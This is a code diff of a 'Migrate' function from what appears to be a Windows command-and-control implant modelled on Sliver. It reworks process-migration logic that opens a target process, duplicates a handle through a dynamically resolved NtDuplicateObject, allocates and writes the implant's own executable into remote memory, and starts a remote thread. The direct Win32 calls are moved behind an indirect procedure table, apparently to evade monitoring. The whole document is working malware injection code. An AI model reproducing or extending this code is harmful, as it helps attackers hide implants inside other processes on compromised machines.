@@ -9,7 +9,7 @@ namespace Task
 {
     // Reference:
     // https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go#L135
-    std::wstring Migrate(const std::wstring& wPid)
+    std::wstring Migrate(State::PSTATE pState, const std::wstring& wPid)
     {
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
 
@@ -17,7 +17,6 @@ namespace Task
 
         // Get the current process executable file name to migrate.
         WCHAR execName[MAX_PATH*4];
-        LPCWSTR lpExecPath;
 
         DWORD dwFileLen = GetProcessImageFileNameW(
             hCurrProcess,
@@ -29,15 +28,15 @@ namespace Task
             return L"Error: Failed to get the current process executable file name.";
         }
 
-        // Get full path for the executable file.
-        lpExecPath = PathFindFileNameW((LPCWSTR)execName);
-
         // Read the executable file data to write process memory.
-        std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(std::wstring(lpExecPath));
-        SIZE_T dataSize = bytes.size();
+        std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(pState->pProcs, std::wstring(execName));
 
         // Open target process to migrate.
-        HANDLE hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwPid);
+        HANDLE hTargetProcess = System::Process::ProcessOpen(
+            pState->pProcs,
+            dwPid,
+            PROCESS_DUP_HANDLE
+        );
         if (!hTargetProcess)
         {
             return L"Error: Could not open the target process.";
@@ -45,43 +44,44 @@ namespace Task
 
         HANDLE hDuplProcess;
 
-        DuplicateHandle(
+        NTSTATUS status = pState->pProcs->lpNtDuplicateObject(
             hTargetProcess,
-            hCurrProcess,
+            &hCurrProcess,
             hCurrProcess,
             &hDuplProcess,
-            0,
+            DUPLICATE_SAME_ACCESS,
             FALSE,
-            DUPLICATE_SAME_ACCESS
+            0
         );
+        if (status != STATUS_SUCCESS)
+        {
+            return L"Error: Failed to duplicate handle.";
+        }
 
-        // Inject the executable data to the duplicated process.
-        LPVOID lpRemoteAddr = VirtualAllocEx(
+        LPVOID pRemoteAddr = System::Process::VirtualMemoryAllocate(
+            pState->pProcs,
             hDuplProcess,
-            NULL,
-            dataSize,
+            bytes.size(),
             MEM_COMMIT,
-            PAGE_READWRITE // PAGE_EXECUTE_READWRITE
+            PAGE_READWRITE
         );
 
-        SIZE_T dwWritten;
-        if (!WriteProcessMemory(
+        DWORD dwWritten;
+        if (!System::Process::VirtualMemoryWrite(
+            pState->pProcs,
             hDuplProcess,
-            lpRemoteAddr,
+            pRemoteAddr,
             bytes.data(),
-            dataSize,
+            bytes.size(),
             &dwWritten
-        ) || dwWritten != dataSize) {
+        ) || dwWritten != bytes.size()) {
             return L"Error: Failed to write target process memory.";
         }
 
-        HANDLE hThread = CreateRemoteThread(
+        HANDLE hThread = System::Process::RemoteThreadCreate(
+            pState->pProcs,
             hDuplProcess,
-            NULL,
-            0,
-            (LPTHREAD_START_ROUTINE)lpRemoteAddr,
-            NULL,
-            0,
+            (LPTHREAD_START_ROUTINE)pRemoteAddr,
             NULL
         );
         if (!hThread)
@@ -90,8 +90,11 @@ namespace Task
         }
 
         // Terminate the current (original) process.
-        // if (!TerminateProcess(hCurrProcess, EXIT_SUCCESS))
-        // {
+        // if (System::Process::ProcessTerminate(
+        //     pState->pProcs,
+        //     hCurrProcess,
+        //     EXIT_SUCCESS
+        // )) {
         //     return L"Error: Failed to terminate the current process.";
         // }
 
